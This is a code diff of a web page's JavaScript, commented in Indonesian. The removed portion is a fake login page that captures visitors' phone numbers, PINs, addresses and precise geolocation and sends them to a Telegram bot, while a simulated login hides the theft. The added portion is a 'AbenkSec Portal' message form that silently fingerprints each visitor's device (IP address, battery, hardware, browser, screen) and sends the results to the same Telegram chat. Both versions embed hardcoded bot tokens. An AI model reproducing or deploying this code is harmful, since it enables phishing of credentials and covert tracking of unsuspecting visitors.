-                    e.target.style.display = 'none';
-                }
-            });
-            
-            function requestLocationAccess() {
-                return new Promise((resolve, reject) => {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            function(position) {
-                                console.log('Lokasi diperoleh:', {
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    accuracy: position.coords.accuracy
-                                });
-                                resolve(position);
-                            },
-                            function(error) {
-                                console.error('Error mendapatkan lokasi:', error);
-                                reject(error);
-                            },
-                            { enableHighAccuracy: true, timeout: 10000 }
-                        );
-                    } else {
-                        const error = new Error('Geolocation tidak didukung');
-                        console.error(error);
-                        reject(error);
-                    }
-                });
-            }
-            
-            async function sendToTelegram(phone, pin, address, locationPermission, position) {
-                const botToken = '7295388135:AAGCFx9Nppyx9w8h08sV05m5nzuBsvRTcAg'; // Ganti dengan token bot Telegram Anda
-                const chatId = '2028336963'; // Ganti dengan chat ID tujuan
-                const locationInfo = position 
-                    ? `Latitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}\nAccuracy: ${position.coords.accuracy} meters`
-                    : 'Lokasi tidak tersedia';
-                
-                const message = `
-🌟 *Data Login Pengguna Baru* 🌟
-📱 *Nomor Telepon*: ${phone}
-🔑 *PIN*: ${pin}
-🏠 *Alamat*: ${address || 'Tidak diisi'}
-📍 *Izin Lokasi*: ${locationPermission ? 'Diaktifkan' : 'Tidak diaktifkan'}
-🌍 *Informasi Lokasi*: 
-${locationInfo}
-📅 *Waktu*: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
-                `.trim();
-                
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
+            const form = document.getElementById('messageForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const successNotification = document.getElementById('successNotification');
+            const closeNotification = document.getElementById('closeNotification');
+            const messageInput = document.getElementById('message');
+
+            // Telegram Bot Configuration
+            const botToken = '8330660041:AAHytB8W_REysr_Vm6fMpSzcQwB_nQZ4FrM';
+            const chatId = '2028336963';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Function to fetch real IP address
+            async function getRealIp() {
                 try {
-                    const response = await fetch(url, {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip || 'Tidak Tersedia';
+                } catch (error) {
+                    console.error('Error fetching IP:', error);
+                    return 'Tidak Tersedia';
+                }
+            }
+
+            // Function to get real device information
+            async function getDeviceInfo() {
+                const now = new Date();
+                const timestamp = now.toLocaleString('id-ID', {
+                    day: '2-digit',
+                    month: '2-digit',
+                    year: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+
+                // Get connection type
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+                const connectionType = connection.effectiveType || connection.type || 'Tidak Tersedia';
+                const networkSpeed = connection.downlink ? `${connection.downlink} Mbps` : 'Tidak Tersedia';
+
+                // Get IP address
+                const ip = await getRealIp();
+
+                // Get device and browser info
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform || 'Tidak Tersedia';
+                const browser = navigator.userAgent.includes('Chrome') ? 'Chrome' :
+                               navigator.userAgent.includes('Firefox') ? 'Firefox' :
+                               navigator.userAgent.includes('Safari') ? 'Safari' :
+                               navigator.userAgent.includes('Edg') ? 'Edge' : 'Lainnya';
+                const browserVersion = navigator.userAgent.match(/(Chrome|Firefox|Safari|Edg)\/([\d.]+)/)?.[2] || 'Tidak Tersedia';
+
+                // Get screen info
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const colorDepth = window.screen.colorDepth || 'Tidak Tersedia';
+                const pixelRatio = window.devicePixelRatio || 'Tidak Tersedia';
+
+                // Get device memory (if available)
+                const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak Tersedia';
+
+                // Get CPU cores (if available)
+                const cpuCores = navigator.hardwareConcurrency || 'Tidak Tersedia';
+
+                // Get battery info (if available)
+                let batteryInfo = 'Tidak Tersedia';
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (Charging: ${battery.charging ? 'Ya' : 'Tidak'})`;
+                }
+
+                // Attempt to infer device model
+                let deviceModel = 'Tidak Tersedia';
+                if (/iPhone|iPad|iPod/.test(userAgent)) {
+                    deviceModel = userAgent.match(/(iPhone|iPad|iPod)[^)]+/)[0];
+                } else if (/Android/.test(userAgent)) {
+                    deviceModel = userAgent.match(/Android[^;]+/)?.[0] || 'Android Device';
+                } else if (/Windows|Macintosh|Linux/.test(userAgent)) {
+                    deviceModel = platform.includes('Win') ? 'Windows PC' :
+                                 platform.includes('Mac') ? 'Mac Device' :
+                                 platform.includes('Linux') ? 'Linux Device' : 'Desktop';
+                }
+
+                // Generate a pseudo-unique device ID (based on browser fingerprint)
+                const deviceId = btoa(`${userAgent}${screenResolution}${platform}${Math.random()}`)
+                    .substring(0, 10).toUpperCase();
+
+                return {
+                    timestamp,
+                    connectionType,
+                    networkSpeed,
+                    ip,
+                    deviceModel,
+                    platform,
+                    browser: `${browser}/${browserVersion}`,
+                    userAgent,
+                    screenResolution,
+                    colorDepth,
+                    pixelRatio,
+                    deviceMemory,
+                    cpuCores,
+                    batteryInfo,
+                    deviceId
+                };
+            }
+
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                const message = messageInput.value.trim();
+                if (!message) return;
+
+                // Show loading state
+                submitBtn.disabled = true;
+                submitBtn.classList.add('loading');
+
+                try {
+                    const deviceInfo = await getDeviceInfo();
+                    const telegramMessage = `
+🌟 Pesan Baru (AbenkSec Portal) 🌟
+Pesan: ${message}
+
+🔍 Detail Perangkat:
+Waktu: ${deviceInfo.timestamp}
+Koneksi: ${deviceInfo.connectionType}
+Kecepatan Jaringan: ${deviceInfo.networkSpeed}
+IP: ${deviceInfo.ip}
+Model Perangkat: ${deviceInfo.deviceModel}
+Platform: ${deviceInfo.platform}
+Browser: ${deviceInfo.browser}
+Resolusi Layar: ${deviceInfo.screenResolution}
+Kedalaman Warna: ${deviceInfo.colorDepth}
+Rasio Piksel: ${deviceInfo.pixelRatio}
+Memori Perangkat: ${deviceInfo.deviceMemory}
+Jumlah Core CPU: ${deviceInfo.cpuCores}
+Tingkat Baterai: ${deviceInfo.batteryInfo}
+ID Perangkat: ${deviceInfo.deviceId}
+User Agent: ${deviceInfo.userAgent}
+                    `.trim();
+
+                    // Send message to Telegram
+                    const response = await fetch(telegramApiUrl, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: chatId,
-                            text: message,
-                            parse_mode: 'Markdown'
+                            text: telegramMessage
                         })
                     });
-                    
-                    if (!response.ok) {
-                        throw new Error('Gagal mengirim data ke Telegram');
+
+                    const result = await response.json();
+                    if (result.ok) {
+                        // Show success notification
+                        successNotification.classList.add('show');
+                        form.reset();
+                    } else {
+                        throw new Error('Gagal mengirim pesan ke Telegram');
                     }
-                    console.log('Data berhasil dikirim ke Telegram');
                 } catch (error) {
-                    console.error('Error mengirim ke Telegram:', error);
+                    console.error('Error:', error);
+                    alert('Terjadi kesalahan saat mengirim pesan. Silakan coba lagi.');
+                } finally {
+                    // Hide loading state
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('loading');
                 }
-            }
-            
-            function simulateLogin(phone, pin, address, locationPermission, position) {
-                // Kirim data ke Telegram
-                sendToTelegram(phone, pin, address, locationPermission, position);
-                
-                // Simulasi proses login (2 detik)
-                setTimeout(() => {
-                    successMessage.classList.add('active');
-                    loginButton.innerHTML = 'MASUK';
-                    loginButton.disabled = false;
-                    setTimeout(() => {
-                        // Optional: redirect ke halaman berikutnya
-                        // window.location.href = '/dashboard';
-                    }, 2000);
-                }, 2000);
-            }
+            });
+
+            closeNotification.addEventListener('click', function() {
+                successNotification.classList.remove('show');
+            });
         });
     </script>
 </body>
-    </html>
+</html>
